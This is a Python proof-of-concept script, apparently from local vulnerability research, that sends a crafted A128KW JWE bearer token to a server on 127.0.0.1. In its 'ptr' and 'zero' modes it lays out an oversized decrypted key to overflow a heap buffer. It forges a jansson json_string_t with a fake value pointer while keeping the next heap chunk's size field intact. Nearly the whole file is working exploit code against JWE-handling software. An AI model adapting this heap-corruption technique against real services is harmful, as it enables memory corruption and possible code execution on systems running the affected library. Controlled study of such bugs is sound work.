#!/usr/bin/env python3
"""W215 throwaway: send one crafted A128KW bearer JWE to 127.0.0.1:18444.

Mode 'ptr'  : 72-byte plaintext laid out as a jansson json_string_t at cek+48
              (type=2, refcount=1, length=16, value=0x4141414141414141) while
              preserving the adjacent 0x41 chunk size field at cek+40..47.
Mode 'zero' : same layout with type/refcount/length/value all zero.
Mode 'ctrl' : correct 40-byte wrapped key, 32 marker bytes only.
"""
import os
import socket
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from probe import token

HOST = "127.0.0.1"
PORT = int(os.environ.get("W2_PORT", "18444"))
EVIDENCE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")
TAG = os.environ.get("W2_TAG", "w215")
KEK = bytes.fromhex(os.environ.get("W2_KEK", "30313233343536373839616263646566"))

mode = sys.argv[1]
if mode == "ctrl":
    ek_len = 40
    plain = b"MISHE-W215-CTRL".ljust(32, b"-")
else:
    ek_len = 80
    plain = bytearray(72)
    plain[0:32] = b"MISHE-W215-REALPTR".ljust(32, b"-")
    plain[32:40] = b"\x00" * 8                    # next chunk prev_size
    plain[40:48] = struct.pack("<Q", 0x41)        # next chunk size (keep heap valid)
    if mode == "ptr":
        plain[48:56] = struct.pack("<II", 2, 1)   # jansson type/refcount
        plain[56:64] = struct.pack("<Q", 16)      # length
        plain[64:72] = struct.pack("<Q", 0x4141414141414141)  # fake value pointer
    # mode 'zero' leaves 48..72 as zeros

tok = token(ek_len, kek=KEK, plaintext=bytes(plain))
req = (
    b"GET /private HTTP/1.1\r\n"
    b"Host: 127.0.0.1:" + str(PORT).encode() + b"\r\n"
    b"User-Agent: w2-w215-probe\r\n"
    b"Authorization: Bearer " + tok.encode("ascii") + b"\r\n"
    b"Connection: close\r\n\r\n"
)
with open(os.path.join(EVIDENCE, "%s-%s-request.bin" % (TAG, mode)), "wb") as f:
    f.write(req)
with open(os.path.join(EVIDENCE, "%s-%s-token.txt" % (TAG, mode)), "w") as f:
    f.write(tok + "\n")
with socket.create_connection((HOST, PORT), timeout=10) as s:
    s.sendall(req)
    chunks = []
    while True:
        data = s.recv(4096)
        if not data:
            break
        chunks.append(data)
resp = b"".join(chunks)
with open(os.path.join(EVIDENCE, "%s-%s-response.bin" % (TAG, mode)), "wb") as f:
    f.write(resp)
print("W215_MODE=%s EK_RAW_LEN=%d PLAIN=%s RESPONSE=%r" %
      (mode, ek_len, bytes(plain)[48:72].hex(), resp[:120]))
